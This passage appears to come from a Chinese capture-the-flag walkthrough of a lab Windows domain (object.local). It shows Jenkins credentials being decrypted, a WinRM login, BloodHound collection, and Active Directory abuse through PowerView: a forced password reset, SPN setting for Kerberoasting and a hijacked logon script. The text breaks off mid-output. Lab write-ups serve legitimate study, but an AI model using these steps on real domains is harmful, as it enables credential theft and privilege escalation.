class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3</span><br><span class="hljs-string">ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFk</span><br><span class="hljs-string">ZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2</span><br><span class="hljs-string">ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1</span><br><span class="hljs-string">OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5</span><br><span class="hljs-string">ZTJiZjBjNzZmZTMxZGIxOQ==&quot;</span> | <span class="hljs-built_in">base64</span> -d &gt; master.key <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=&quot;</span> |<span class="hljs-built_in">base64</span> -d &gt; hudson.util.Secret <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml <br>[<br>  &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;320a60b9-1e5c-4399-8afe-44466c9cde9e&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;c1cdfun_d2434\u0003\u0003\u0003&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;oliver&quot;</span><br>  &#125;<br>]<br></code></pre></td></tr></table></figure><p>目标开着5985 winrm，可以尝试登录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span> <span class="hljs-literal">-u</span> oliver <span class="hljs-literal">-p</span> c1cdfun_d2434                 <br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver&gt; <span class="hljs-built_in">cd</span> desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\oliver\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-ar---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">00</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br><span class="hljs-built_in">cat</span> *Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\desktop&gt; <span class="hljs-built_in">cat</span> user.txt<br>de..............................................<br></code></pre></td></tr></table></figure><p>用户还会有另外两个：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">11</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">3</span>:<span class="hljs-number">20</span> AM                Administrator<br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">7</span>:<span class="hljs-number">59</span> AM                maria<br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">7</span>:<span class="hljs-number">58</span> AM                oliver<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">10</span>:<span class="hljs-number">49</span> AM                Public<br>d<span class="hljs-literal">-----</span>       <span class="hljs-number">10</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">3</span>:<span class="hljs-number">44</span> AM                smith<br></code></pre></td></tr></table></figure><p>并且不出意外的我没有权限访问，目标还开放了大量端口，但是因为防火墙规则我都无法访问：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\desktop&gt; netstat <span class="hljs-literal">-an</span> | findstr LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">80</span>             <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">88</span>             <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">135</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">389</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">445</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">464</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">593</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">636</span>            <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">3268</span>           <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">3269</span>           <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">5985</span>           <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>           <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">9389</span>           <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">47001</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49664</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49665</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49666</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">0</span>              LISTENING<br></code></pre></td></tr></table></figure><p>不过现在对于我来说似乎无所谓，因为winrm走的5985端口，目标开着，而且我已经成功登录了上来，并且evil-winrm内置了一些上传功能模块：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; upload /home/mosaic/Tools/SharpHound/SharpHound.exe<br>Info: Uploading /home/mosaic/Tools/SharpHound/SharpHound.exe to C:\Users\oliver\Documents\SharpHound.exe<br><br>                                                             <br><span class="hljs-keyword">Data</span>: <span class="hljs-number">1209000</span> bytes of <span class="hljs-number">1209000</span> bytes copied<br><br>Info: Upload successful!<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\oliver\Documents<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">1</span>:<span class="hljs-number">23</span> AM         <span class="hljs-number">906752</span> SharpHound.exe<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; .\SharpHound.exe <span class="hljs-literal">-c</span> all<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">14.8902643</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Resolved Collection Methods: <span class="hljs-built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">14.9058982</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Initializing SharpHound at <span class="hljs-number">1</span>:<span class="hljs-number">25</span> AM on <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span><br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">15.1558821</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Flags: <span class="hljs-built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">15.3433839</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Beginning LDAP search <span class="hljs-keyword">for</span> object.local<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">15.3902572</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Producer has finished, closing LDAP channel<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">15.3902572</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|LDAP channel closed, waiting <span class="hljs-keyword">for</span> consumers<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">45.4683889</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">0</span> objects finished (+<span class="hljs-number">0</span> <span class="hljs-number">0</span>)/s <span class="hljs-literal">--</span> <span class="hljs-keyword">Using</span> 36 MB RAM<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">58.9058786</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Consumers finished, closing output channel<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">58.9527603</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Output channel closed, waiting <span class="hljs-keyword">for</span> output task to complete<br>Closing writers<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">59.3121320</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">92</span> objects finished (+<span class="hljs-number">92</span> <span class="hljs-number">2.139535</span>)/s <span class="hljs-literal">--</span> <span class="hljs-keyword">Using</span> 54 MB RAM<br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">59.3121320</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Enumeration finished <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">43.9667164</span><br><span class="hljs-number">2022</span><span class="hljs-literal">-05-20T01</span>:<span class="hljs-number">25</span>:<span class="hljs-number">59.4840046</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>|INFORMATION|SharpHound Enumeration Completed at <span class="hljs-number">1</span>:<span class="hljs-number">25</span> AM on <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>! Happy Graphing!<br>**Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\oliver\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">08</span> AM           <span class="hljs-number">9027</span> <span class="hljs-number">20220520020847</span>_BloodHound.zip<br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">08</span> AM          <span class="hljs-number">10043</span> MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin<br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">02</span> AM         <span class="hljs-number">832512</span> Sharphound.exe<br><span class="hljs-literal">-ar---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">00</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\desktop&gt; download C:\Users\oliver\desktop\<span class="hljs-number">20220520020847</span>_BloodHound.zip <span class="hljs-number">20220520020847</span>_BloodHound.zip <br></code></pre></td></tr></table></figure><p>在查看当前用户信息时候，会发现当前用户oliver有一个一级控制对象：<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520182517994.png" alt="image-20220520182517994"  /></p><p>我可以直接更改掉SMITH账户的密码。再看SMITH账户：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520192526902.png" alt="image-20220520192526902"  /><p>它对MARIA账户有通用写权限，我可以发起Kerberoasting，给MARIA账户设置一个SPN值将其视为一个服务帐号，然后通过kerbeos协议请求访问MARIA的TGS服务票据，我可以离线破解该票据尝试获取MARIA账户的口令。再看MARIA账户：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220520193633470.png" alt="image-20220520193633470"  /><p>他对域管理组有任意改写权限。那么现在思路应该清楚了，不过我需要依靠PowerView。首先我要更改SMITH账户的密码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; upload /home/mosaic/Tools/PowerSploit/Recon/PowerView.ps1<br>Info: Uploading /home/mosaic/Tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\oliver\Documents\PowerView.ps1<br><br>                                                             <br><span class="hljs-keyword">Data</span>: <span class="hljs-number">482560</span> bytes of <span class="hljs-number">482560</span> bytes copied<br><br>Info: Upload successful!<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; . .\PowerView.ps1<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; <span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;Password123!&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\oliver\Documents&gt; <span class="hljs-built_in">Set-DomainUserPassword</span> <span class="hljs-literal">-Identity</span> smith <span class="hljs-literal">-AccountPassword</span> <span class="hljs-variable">$SecPassword</span><br></code></pre></td></tr></table></figure><p>我不知道SMITH是否在远程管理组里边，我尝试查看会被告知权限不够，不过很幸运，他确实能登录：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.132</span> <span class="hljs-literal">-u</span> smith <span class="hljs-literal">-p</span> Password123!<br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\smith\Documents&gt; <br></code></pre></td></tr></table></figure><p>接下来我要给MARIA设置SPN：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\smith\Documents&gt; <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Identity</span> maria <span class="hljs-literal">-SET</span> <span class="hljs-selector-tag">@</span>&#123;serviceprincipalname=<span class="hljs-string">&#x27;MSSQLSvc/object.local:1433&#x27;</span>&#125;<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\smith\Documents&gt; <span class="hljs-built_in">Get-DomainUser</span> maria | <span class="hljs-built_in">Select</span> serviceprincipalname<br><br>serviceprincipalname<br><span class="hljs-literal">--------------------</span><br>MSSQLSvc/object.local:<span class="hljs-number">1433</span><br></code></pre></td></tr></table></figure><p>但似乎我的凭据无效：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\smith\Documents&gt; <span class="hljs-built_in">Get-DomainSPNTicket</span> <span class="hljs-literal">-SPN</span> <span class="hljs-string">&quot;MSSQLSvc/object.local:1433&quot;</span><br>Warning: [<span class="hljs-built_in">Get-DomainSPNTicket</span>] Error requesting ticket <span class="hljs-keyword">for</span> SPN <span class="hljs-string">&#x27;MSSQLSvc/object.local:1433&#x27;</span> from user <span class="hljs-string">&#x27;UNKNOWN&#x27;</span> : Exception calling <span class="hljs-string">&quot;.ctor&quot;</span> with <span class="hljs-string">&quot;1&quot;</span> argument(s): <span class="hljs-string">&quot;The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details.&quot;</span><br></code></pre></td></tr></table></figure><p>我尝试新建了一个，但是没什么用，而且我无法直接访问MARIA用户的目录，不过我找到了另一种方法：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.thehacker.recipes<span class="hljs-regexp">/ad/m</span>ovement<span class="hljs-regexp">/dacl/</span>logon-script<br></code></pre></td></tr></table></figure><p>因为SMITH用户对MARIA有通用写权限，我可以使MARIA用户在登录时执行一些我自定义的脚本，比如打印他的所有目录并输出到我能访问的目录，当然也需要MARIA用户也有写权限的目录：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">dir</span> C:\Users\maria\Desktop &gt; C:\ProgramData\<span class="hljs-built_in">dir</span>.txt<br></code></pre></td></tr></table></figure><p>我会将它制定为一个powershell脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;dir C:\Users\maria\Desktop &gt; C:\ProgramData\dir.txt&quot;</span> &gt; login.ps1<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">type</span> login.ps1<br><span class="hljs-built_in">dir</span> C:\Users\maria\Desktop &gt; C:\ProgramData\dir.txt<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Identity</span> maria <span class="hljs-literal">-SET</span> <span class="hljs-selector-tag">@</span>&#123;scriptpath=<span class="hljs-string">&quot;C:\\programdata\\login.ps1&quot;</span>&#125;<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\programdata<br><br><br>Mode                LastWriteTime         Length 